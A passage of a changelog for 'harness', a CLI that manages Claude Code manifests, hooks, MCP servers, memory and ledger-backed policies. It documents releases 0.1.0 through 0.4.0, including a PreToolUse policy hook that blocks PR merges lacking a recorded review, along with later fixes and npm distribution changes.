  tries `type='policy_decision'` and falls back to legacy `type='fact'`
  on an old server. Reader tags rows with their bucket-derived type so
  the requires evaluator can drop policy-decision rows without the
  substring-pollution that inflated `matchedCount` in PR #39's dogfood.
  Legacy `policy_decision:`-prefixed `fact` rows are also dropped via a
  content-prefix backstop so upgraded users don't keep paying the
  pollution tax until their dev ledger ages out.
- **Server-side `audit` filter pushdown** (Phase 5 #5, PR #46) via the
  matching evidence-ledger 0.2.0 change. `audit` now passes
  `sinceIso` (derived from its `--since` cutoff) and
  `contentPrefix: "policy_decision:"` to `ledger_summary`. Capability
  detection via `tools/list` keeps it back-compatible with old servers
  (filter args are dropped silently when not advertised). Hot path
  (no filter requested) skips `tools/list` entirely.
- **`dogfood/phase5/`** — reproducible smoke driver against real
  grounding-mcp + live SQLite ledger (Phase 5 #1, PR #39). All five
  gates (deny / ledger_add / silent allow / 5m audit / 24h audit /
  explain --trace) exit non-zero on regression.
- **`tests/_helpers/manifest.ts` + `tests/_helpers/decision.ts`** (Phase 5
  #6, PR #45) — shared `makeManifest`, `makePolicy`, `makeDecision`,
  `makeDecisionEntry` builders. Pure refactor; existing test count
  unchanged.

### Fixed

- **`audit --since` window now parses UTC ledger timestamps correctly**
  (Phase 5 #8, PR #40). evidence-ledger stores `created_at` as SQLite
  `datetime('now')` (UTC, space-separated). V8's `Date.parse` parses
  the space form as local time; on any non-UTC host a `--since` window
  narrower than the host TZ offset silently filtered out fresh
  entries. New `parseLedgerTimestamp` coerces the SQL form to ISO-with-
  Z before delegating to `Date.parse`. Applied at all four call sites
  (audit row sort + cutoff filter, explain `selectLatestForPolicy`,
  `requires.entryTime`).
- **`explain --trace` picks the latest decision by `evaluatedAt`**
  (Phase 5 #9, PR #41). Sub-second collisions used to tie at
  `bt - at = 0` because the sort keyed on ledger `createdAt`
  (1-second precision), and V8's stable sort returned the earliest
  fire. New `decisionSortKey` prefers the decoded payload's
  `evaluatedAt` (ms precision), fallback to `createdAt`. Same fix in
  `audit` row order.

### Distribution

- Package renamed from `harness` (the unscoped name was already taken on
  npm) to `@lannguyensi/harness`. The CLI binary is still `harness`.
- New `publish-npm.yml` workflow tags `v*` → publishes to npm with
  provenance. Single package; no monorepo workspace.

## [0.4.0] - 2026-04-30

**Phase 4: policy layer.** Policies *fire*. The `requires` schema
(`ledger_tag`, `+ within`, `+ count` from `docs/ARCHITECTURE.md` §6) is
now evaluatable at the actual hook event. `harness policy intercept`
runs as a `PreToolUse` hook: it reads the tool-event JSON from stdin,
runs every matching policy through extract-substitution + ledger-query
+ requires-evaluation, and emits Claude Code's `{"decision":"deny",...}`
JSON when blocking. Each fire writes one `policy_decision` entry to the
evidence ledger via grounding-mcp `ledger_add` so `harness explain
--trace` and `harness audit` can replay decisions. The killer-test from
the founding incident is answered end-to-end: `mcp__agent-tasks__pull_requests_merge`
against a session without a `review:${PR_NUMBER}` ledger entry refuses;
the same call after `ledger record review:42 …` is allowed.

The exit-gate from `docs/ROADMAP.md` is met against a fresh tmpdir
install: deny without ledger entry / silent allow with one / silent
allow on unreachable ledger / `explain --trace` shows the full decision
trail / `audit --since 1h` lists both deny+allow fires sorted ascending
/ `dry-run "merge PR 42"` statically reports `[review-before-merge]` /
validate enhancements reject `within: yesterday`, `count.min: 0`, and
warn when policies are declared without `grounding-mcp` wired.

### Added

- **`evaluateRequires` library** (`src/policies/requires.ts`) — pure
  evaluator over the three v1 `requires` shapes returning
  `{ allowed, reason, matchedCount, traceData }`. Reason strings match
  the spec verbatim (`no matching ledger entry for tag \`<tag>\``,
  `no matching entry within <duration>`, `<n> of required <bound>
  entries found`). Rejects `within: <bad-duration>` and `count.min: 0`
  at evaluation time as well as validate time.
- **`evaluateExtract` evaluator + `validateExtractGrammar` parser**
  (`src/policies/extract.ts`) — JSONPath-restricted DSL: dotted
  accessors rooted at `toolArgs / event / session / git`, with
  bracket-quoted keys for non-identifier names. Function calls,
  numeric/slice indices, unknown namespaces all rejected with the
  spec-mandated literal phrases. Built-in vars (`SESSION_ID, REPO,
  BRANCH, TOOL_NAME, CWD`) auto-resolve; extracts override on
  collision with one trace row per variable. `substituteTemplate`
  completes the Appendix-A `review:${REPO}:${PR_NUMBER}` end-to-end.
- **`queryLedgerByTag` adapter** (`src/policies/ledger-client.ts`) —
  spawns the configured grounding-mcp, performs the
  init/notifications/initialized/`tools/call` handshake, parses
  `ledger_summary`, and returns
  `{ kind: "ok", entries } | { kind: "degraded", reason }`. Every
  spec-named failure mode (spawn ENOENT, JSON-RPC error, stdout
  closes, timeout, payload-shape drift) maps to `degraded`. Empty
  ledger ≠ degraded.
- **Validate enhancements** — schema delegates `within` to the runtime
  duration parser, rejects `count.min: 0` with the literal "no-op"
  message, validates `trigger.extract` grammar via
  `validateExtractGrammar`, and the CLI layer warns when
  `policies[]` is non-empty but no `tools.mcp[name: grounding-mcp]`
  is wired (links to `docs/ARCHITECTURE.md` §6).
- **Runtime hook interceptor** (`src/runtime/intercept.ts` +
  `src/cli/policy/intercept.ts`) — wired as `harness policy intercept`.
  Reads tool-event JSON from stdin; runs every matching policy;
  evaluates ALL, denies if any block-enforcement policy denies;
  warn-enforcement deny does NOT block. Unresolved extract →
  `warn-degraded`. Audit-write failure does NOT crash. Multiple
  matching policies on the same event all fire; one ledger entry
  per fire.
- **`harness explain <policy> --trace`** — replaces the Phase 1 stub.
  Reads the most-recent `policy_decision` entry for the named policy
  and renders the full decision trail (decision, reason,
  triggerMatched, extract substitutions, requiresEval, ledgerQuery).
  Cross-policy entries skipped; latest by `createdAt` wins; malformed
  content silently skipped. Exit codes: 64 missing policy / 1 missing
  evaluation / 1 degraded ledger.
- **`harness audit [--since <duration>] [--policy <name>] [--outcome
  <allow|deny|warn-degraded>] [--session <id>] [--json]`** — replays
  the evidence ledger for a window; default 24h. Sorted ascending.
  Empty window → documented literal, exit 0. Degraded ledger →
  `ledger unreachable: <reason>`, exit 69 (EX_UNAVAILABLE). Bad input
  → exit 64.
- **`harness dry-run "<prompt>" [--tool <name>] [--tool-args <json>]
  [--json]`** — static prediction (no LLM, no ledger I/O). With
  `--tool`, simulates a `PreToolUse` event and reports
  `ledgerQuery=<substituted tag>` for each matching policy.
  PreToolUse policies bucket as "could match" without `--tool`.
- **`policy_decision` audit-log encoding**
  (`src/runtime/ledger-record.ts`) — canonical
  `policy_decision:<name>:<outcome> <json-blob>` format with
  encode/decode round-trip helpers the audit/explain verbs consume.

### Changed

- `harness explain` is now async; the CLI awaits the result. Default
  output gains a `--trace` hint replacing the "ships in Phase 4"
  placeholder.
- Schema modules (`src/schema/extract.ts`, `src/schema/requires.ts`)
  delegate to the runtime grammar/duration helpers. No cycle:
  `policies/duration.ts` and `policies/extract.ts` are leaves.

### Notes

- Real Claude Code dogfood (vs. a fake stdio script) is captured in
  the v0.4.0 release PR description; tests use the fake-stdio pattern
  from `tests/probes/mcp.test.ts`.
- Test count: 519/519 green (pre-release; up from 417 at v0.3.0).

## [0.3.0] - 2026-04-30

**Phase 3: declarative truth.** `harness apply` regenerates
`harness.generated/settings.json` and `harness.generated/MEMORY.md` from
the manifest, with the three-state drift detection from
`docs/ARCHITECTURE.md` §7 protecting hand-edits. `harness.lock` pins
SHA-256 of every referenced asset (hook scripts, MCP entrypoints, skill
SKILL.md, memory-router binary) plus per-directory Merkle aggregates for
memory dirs. `harness diff --since-apply` reports drift across three
sections (generated files, asset SHAs, memory dirs); `--memory-detail`
expands per-directory Merkle entries to per-file changes. Asset-content
drift is reported on every apply against the lock with the canonical
message format: `asset drift detected: <path> changed since last apply`.

The exit-gate from `docs/ROADMAP.md` is met: against a fresh tmpdir
install of `init --template full`, `apply` writes both generated files
and the lock; re-`apply` is `no changes`; hand-edited
`harness.generated/settings.json` refuses with the documented diff +
hint and `--overwrite-drift yes` restores it; an externally-edited hook
script surfaces `asset drift detected:` on stderr; a memory-file edit
under a tracked memory directory surfaces a single Merkle drift line
which `diff --since-apply --memory-detail` expands to the changed
filename.

### Added

- `harness apply [--config <path>] [--project <name>] [--dry-run] [--overwrite-drift]`
  — regenerate runtime files from the manifest. Three-state comparator
  (manifest-expected / last-applied / on-disk-current) decides per file:
  `safe-overwrite` (write fresh), `no-drift` (overwrite is safe), or
  `drift-refuse` (refuse with diff + adopt-or-overwrite hint). Drift
  refusal exits 1; `--overwrite-drift` requires literal `yes` (case-
  insensitive, rejects `y`) before discarding hand-edits. `--dry-run`
  prints the would-be diff and restart hints, exits 0 without writing.

- `harness diff --since-apply [--memory-detail] [--json]` — diff against
  the last applied state. Three sections: `# Generated files` (unified
  diff per file), `# Asset drift` (lock SHA mismatches), `# Memory
  directories` (Merkle drift; `--memory-detail` expands to per-file
  added / removed / modified). Exit 0 on no drift; exit 1 on any
  drift. Mutually exclusive with `--since <ref>` (EX_USAGE).

- Asset-content drift detection on every apply: re-hashes every locked
  asset / memory-dir Merkle, surfaces mismatches as warning-style
  stderr lines. Warn-only by default; the lock is rewritten with current
  SHAs at the end of the run, so drift is reported once and the next
  apply is clean. Users wanting enforcement wrap apply in a script that
  greps for `asset drift detected:`.

- Restart-hint emitter: comparing the prior-apply manifest snapshot with
  the current effective manifest, apply prints `mcp servers changed; …`
  on `tools.mcp[]` change, `memory router command changed; …` on
  `memory.router.command` change, `hooks changed; …` on hook /
  policy structure change. Description-only edits emit no hints.

- Library modules (no CLI verbs of their own):
  - `src/io/three-state.ts` — `compare()` returning `safe-overwrite` /
    `no-drift` / `drift-refuse` per the §7 decision table.
  - `src/io/last-apply.ts` — read/write `harness.generated/.last-apply`
    with file SHA + content + optional manifest snapshot + optional
    per-memory-dir per-file index. Atomic-write contract from Phase 2.
    `verifyLastApplyIntegrity()` defends against on-disk corruption.
  - `src/io/harness-lock.ts` — NDJSON `harness.lock` writer/reader.
    Asset entries (hook scripts, MCP entrypoints, skill SKILL.md,
    memory-router binary) plus Merkle-style memory-dir aggregates.
    `enabled: false` mcp[] / `memory.router` and known interpreter
    binaries (`node`, `npx`, `python`, `bash`, `sh`, `tsx`, `deno`,
    `bun`) are excluded. Locale-independent byte-order sort.
    `computeDrift()` returns missing/modified per locked asset.
  - `src/io/restart-hints.ts` — pure manifest-delta to hint list.
  - `src/cli/apply/generate-settings.ts` — manifest hooks projection
    into Claude Code's nested `settings.json` shape.
  - `src/cli/apply/generate-memory-index.ts` — walks
    `memory.directories[]`, parses frontmatter, emits the markdown
    index. CRLF-tolerant; matches the canonical loader's strict
    `name` + `type` requirement; warns + skips on basename collision
    across memory directories.

### Decided here

- **Lock granularity.** Every referenced path gets one entry, except
  memory directories which collapse to a Merkle aggregate per directory
  (so a 1000-memory install does not produce a 1000-line lock). Per-
  file detail is recoverable on demand via
  `harness diff --since-apply --memory-detail`. Per-file index lives
  in `.last-apply` (next to the directory hash); the lock stays small.

- **Asset drift is warn-only at apply time.** Enforcement is one shell
  script wrapper away (`grep "asset drift detected:"`); coupling
  enforcement into the verb itself would be the wrong default for the
  founding-incident use case (where one edit upstream of harness
  shouldn't block the user from re-applying).

- **`apply` writes to `harness.generated/`.** When `--config` is passed
  without an explicit home, generated artefacts live next to the
  configured manifest, not in `~/.claude/harness.generated/`. This
  closes a smoke-test footgun where running with `--config /repo/...`
  silently scribbled into the user's global runtime directory.

- **Manifest snapshot integrity.** The optional manifest snapshot in
  `.last-apply` is sha-checked before being used for restart-hint
  comparison; on mismatch, hints fall back to "no prev manifest" so a
  corrupted record does not produce confidently-wrong restart hints.

- **`path_match` and `bash_match` do NOT survive the settings.json
  projection.** Per ARCHITECTURE Appendix A canonical pattern, these
  filters are enforced inside the referenced hook script. The manifest
  fields exist for `validate` / `doctor` inventory.

### Carried into Phase 4

- **No policy enforcement.** Policies are still schema-only;
  `requires.ledger_tag` / `+ within` / `+ count` evaluation against the
  evidence ledger lands in Phase 4.
- **No `validate --check-lock`.** Lock-drift is surfaced by `apply`
  and `diff --since-apply` in Phase 3; folding it into `validate`
  is a deferred follow-up.

## [0.2.0] - 2026-04-29

**Phase 2: managed edits.** Five write verbs (`init`, `add`, `remove`,
`adopt`, `export`) plus the foundation library (file lock, atomic write,
schema-validate-before-write, unified-diff emitter). The exit-gate from
`docs/ROADMAP.md` is met: a fresh tmpdir round-trip of init → add (mcp /
cli / hook / skill) → adopt → export → remove → validate runs clean,
with comments preserved across every mutation.

### Added

- `harness init [--template minimal|full] [--force] [--config <path>]` —
  bootstrap a starter manifest. `minimal` is the empty-but-valid header
  + comment block (`harness validate` passes immediately). `full` is
  pre-populated from ARCHITECTURE.md Appendix A (3 MCPs, 3 CLIs, 4
  skills, 4 hooks, 3 policies). Refuses to overwrite without `--force`;
  `--force` emits an `(overwriting ...)` line on stderr.

- `harness add <type> <name> ...` — managed insert. Four sub-commands:
  `add mcp <name> --command <cmd> [--health-verb <v>] [--health-timeout-ms <n>] [--enabled <bool>]`,
  `add cli <name> --binary <b> [--required] [--min-version <v>]`,
  `add skill <name>` (managed enable in `tools.skills.enabled[]`),
  `add hook <name> --event <e> --command <c> [--match <r>] [--blocking false|soft|hard] [--budget-ms <n>]`.
  Common flags `--config <path>`, `--dry-run`. Two-stage gate before
  writing: schema (catches duplicate names, dangling references) +
  asset (catches non-+x hook scripts, missing required CLIs). Dry-run
  emits the unified diff and exits 0 without writing.

- `harness remove <type> <name>` — drop entries by name with hook-aware
  reference check. Refuses to remove a hook still referenced by a
  policy unless `--force`; with `--force`, the schema gate (dangling
  `policy.hook`) is the safety net so a broken manifest never lands.
  `<unknown>` exits 1 with the available-name list. `--dry-run` shows
  the patch with `-` lines.

- `harness adopt <file> [--yes]` — capture hand-edits from
  `~/.claude/settings.json` back into the manifest. Computes drift
  (settings hooks not declared in the manifest), synthesises names
  from command basenames with `-2/-3/...` disambiguation, prints the
  unified diff, prompts `Apply (y/N)?` per the write-and-confirm
  decision. `--yes` skips the prompt. Adopted hooks default to
  `blocking: false` so capture never starts gating tool calls
  unintentionally. Idempotent on re-run.

- `harness export [--sanitize] [--json] [-o <file>]` — emit the
  effective merged manifest as a single self-contained YAML or JSON.
  `--sanitize` rewrites `/home/<user>/...` → `~/...` (with a trailing-
  separator anchor so `/home/lan` does not match inside
  `/home/landscape`) and redacts env values whose key matches
  `/(_|^)(KEY|TOKEN|SECRET|PASSWORD|API_KEY)$/i` to `<REDACTED>`.
  Footer comment names what is and is not covered. `-o <file>` writes
  atomically via the foundation's tmp+fsync+rename.

- `src/io/` foundation library: `withFileLock(lockPath, fn)` (via
  `proper-lockfile`, lock-then-mutate-then-release), `atomicWriteFile`
  (tmp+fsync+rename), `withDocument` (CST round-trip preserving user
  comments and long flow sequences), `validateBeforeWrite`
  (parseManifest gate returning structured errors), `unifiedDiff`
  (compatible with `patch -p0`).

- Example manifest + Appendix A: `grounding-mcp` MCP entry with
  `EVIDENCE_LEDGER_DB` env, the `require-preflight-evidence` hook,
  and the `preflight-before-investigation` policy that gates
  investigative `git status|log|diff|branch` on a fresh
  `agent-preflight` ledger entry. Wires the founding-incident
  block-policy concretely.

- Phase 4 ROADMAP acceptance bullet: `validate` warns when `policies[]`
  is non-empty but no `tools.mcp[]` entry named `grounding-mcp` is
  wired (prevents silent degraded-mode failure).

### Changed

- `agent-preflight` repositioned in README §Related and across
  VISION / ARCHITECTURE / ROADMAP as the **canonical implementation**
  of preflight hook content, not a sibling tool. The hook script
  `~/.claude/hooks/git-preflight.sh` is canonically a thin wrapper
  around `preflight run --json` + a `ledger record preflight:${REPO}`
  call. ARCHITECTURE §5 acknowledges this pattern: hook commands are
  routinely thin wrappers around named tools, not bespoke shell.

- `withDocument` now passes `lineWidth: 0` to the YAML stringifier so
  long flow sequences are not silently rewritten to block style on
  round-trip.

### Decided here

- **`harness adopt` UX: write-and-confirm.** Reads the file, computes
  the patch, prints a unified diff, prompts `Apply (y/N)?`. No editor
  mode, no patch-to-stdout shape. `--yes` is the non-interactive
  escape hatch. Per ROADMAP "Open decisions resolved here #2".

- **`harness add policy` is intentionally absent in Phase 2.** Policy
  evaluation lands in Phase 4; shipping `add policy` here would create
  the schema-without-behaviour failure mode.

### Known limitations carried from Phase 1

- No `harness apply` (Phase 3): adopt captures from settings.json into
  the manifest, but the inverse — generating settings.json *from* the
  manifest — is Phase 3.
- No policy evaluation (Phase 4): the schema parses `requires` /
  `trigger.extract` and `validate` lints them, but no policy fires
  against the ledger yet.
- No `harness.lock` (Phase 3): asset-content drift (a hook script
  edited under your feet) is not yet detectable; manifest-layer
  drift is.

## [0.1.0] - 2026-04-29

**Phase 1: read-only inventory.** First releasable cut. Six CLI verbs
(`describe`, `validate`, `doctor`, `list`, `explain`, `diff`) backed by a
single zod-validated YAML manifest with a per-machine + per-project
override layer. No write-side verbs yet, no policy evaluation, no lock
file. The exit-gate from `docs/ROADMAP.md` is met: `harness doctor` against
a real manifest reproduces the Appendix-D structure with `✗ FAILED:` lines
that surface the actual MCP-server stderr, not generic "unhealthy" labels.

### Added

- `harness describe [--config <path>] [--project <name>] [--pillar <p>] [--json]` —
  print the effective merged manifest. YAML by default, JSON via `--json`.
  `--pillar` filters to one of grounding / tools / memory / hooks /
  policies. Golden fixture `docs/examples/full-manifest.expected.yaml`
  locks the format down byte-for-byte.

- `harness validate [--config <path>] [--project <name>] [--strict]` —
  schema lint plus six asset-existence checks: `mcp[].command` first-arg
  rooted-path resolution, `cli[].binary` `$PATH` resolution + semver
  comparison against `min_version`, `tools.skills.required` SKILL.md
  presence, `hooks[].command` exists/regular-file/`+x`, `tools.builtin`
  one-sided drift warning. `--strict` promotes warnings to errors.
  Diagnostics print to stderr; clean runs print "no validation findings"
  to stdout. Exit codes per `sysexits.h`: 1 / 64 / 66.

- `harness doctor [--config <path>] [--project <name>] [--shallow]` —
  the killer-test value-demo. Spawns each `mcp[]` server, runs
  initialize → tools/call over JSON-RPC stdio, races against the
  configured `health.timeout_ms` and the child's exit. Captures stderr
  verbatim so a broken server surfaces with the actual error message.
  `--shallow` skips probe spawning (useful in tight iteration loops);
  reports `~ name  manifest-only (probe skipped)` instead of falsely
  claiming "healthy". Output follows ARCHITECTURE Appendix D structure
  (Manifest / Tools / Memory / Hooks / Policies / Summary).

- `harness list <category> [--filter <substr>] [--json]` —
  pipe-friendly flat listing across the six categories
  (`mcp` / `cli` / `skills` / `memories` / `hooks` / `policies`).
  Default output is a column-aligned table; `--json` gives a flat
  array suited for `jq`. `--filter` is case-insensitive substring
  match on `name` (or `path` for `memories`).

- `harness explain <policy-name> [--json]` — schema-only printer for a
  named policy. Includes the Phase-1 caveat
  `schema valid; last-evaluated tracking ships in Phase 4`. Missing
  policy → exit 64 with the available-name list (`(none)` when zero
  policies are declared). `--trace` is intentionally NOT wired here;
  it lands in Phase 4.

- `harness diff --since <ref>` — manifest-layer diff against a git ref.
  Name-keyed lists (`tools.mcp[]`, `hooks[]`, `policies[]`) diff by
  `name`, so a single field change emits exactly one hunk on that
  field rather than a wholesale list re-emit. Output groups changes
  under per-pillar headers (`## tools`, `## hooks`, etc.).
  `--since-apply` is explicitly Phase 3 and not wired.

- **Manifest schema (zod)** for `version: 1` covering all five pillars
  (grounding / tools / memory / hooks / policies) with strict-by-default
  unknown-key rejection. Includes the `trigger.extract:` JSONPath
  grammar (restricted to dotted accessors rooted at `toolArgs` /
  `event` / `session` / `git`) and the three v1 `requires` shapes
  (`ledger_tag`, `+ within`, `+ count`). Cross-policy validation
  rejects `${PR_NUMBER}` references that lack a matching
  `trigger.extract` entry.

- **Override engine** implementing every `ARCHITECTURE.md` §8 rule:
  scalar replace, map merge, name-keyed list merge, plain-list
  wholesale replace, `null` tombstone, empty-list `[]` clears,
  mixed-shape rejection, `_delete: true` removal. Result is fully
  owned (deep-cloned), so callers can mutate without corrupting the
  parsed base.

- **Per-machine override layer** at
  `~/.claude/machines/<discriminator>.harness.overrides.yaml` with
  three discriminator types (`hostname` / `os` / `default`) and
  WSL2 detection via `/proc/version` containing `microsoft`
  (case-insensitive). Merge order: base → os → hostname → project.

- **MCP stdio probe** (`src/probes/mcp.ts`) with `RealMcpProbe` (real
  spawn) + `McpProbe` interface for test injection. Concurrent probes
  via `Promise.all`. EPIPE handling on early-exit servers; pending
  timers are cleared in `finally`.

- **Memory introspection** (`src/probes/memory.ts`): walks declared
  memory directories, surfaces `*.md` files older than
  `retention.staleness_days` with last-touched dates. Router-executable
  detection picks the first absolute / `~/...` path in
  `memory.router.command`, not the runtime binary.

- **Loader split** (`loadMergedRaw` vs `loadManifest`) so `validate`
  can convert schema errors to structured diagnostics (exit 1) while
  `describe` keeps refusing to print broken manifests (exit 66).

### Resolved design questions

Per `docs/ROADMAP.md` "Open decisions resolved here":

- **Phase-1 doctor health checks: real call default + first-class
  `--shallow` flag.** The default mode invokes each `mcp[].health.verb`
  with the configured `timeout_ms` so users learn the diagnostic value
  immediately. `--shallow` is the explicit fast-path opt-in; both modes
  are first-class.

- **Override granularity for memory directories.** Lists of
  name-keyed entries (`tools.mcp`, `hooks`, `policies`) merge by
  `name`; lists without `name` (`memory.directories`) replace
  wholesale. Mixed-shape lists are rejected at merge time.

- **`harness adopt` UX (Phase 2 deferred).** Per ROADMAP, write-and-confirm
  is the chosen pattern: `harness adopt <file>` will read the on-disk
  file, compute the manifest patch, print a unified diff, and prompt
  `Apply (y/N)?`. This release does not ship `adopt`; the decision is
  recorded so Phase 2 picks up where the design left off.

- **Policy storage location (Phase 4 deferred).** Inline `policies:` in
  the main manifest is the runtime-firing surface; library-style
  imported policies (e.g. claim-gate via `grounding.policies_source`)
  stay in their own DSL files. Phase 1 only validates the inline shape;
  Phase 4 wires the evaluator.

### Known limitations (deferred to later phases)

- **No `harness apply`.** Source-of-truth applies at the *manifest*
  layer only; runtime files (`~/.claude/settings.json`, etc.) stay
  user-owned in Phase 1. Generation lands in Phase 3.
- **No policy evaluation.** Policies are schema-only in Phase 1;
  `harness explain --trace` and `harness audit` ship in Phase 4.
- **No `harness.lock`.** Asset-content drift (a hook script edited
  under your feet) is detectable only after the lock file ships in
  Phase 3.
- **No write verbs.** `init`, `add`, `remove`, `adopt`, `export`
  ship in Phase 2.

### Tests

147 vitest cases across 12 files. Line coverage: 93.75% on `src/`.

[0.1.0]: https://github.com/LanNguyenSi/harness/releases/tag/v0.1.0
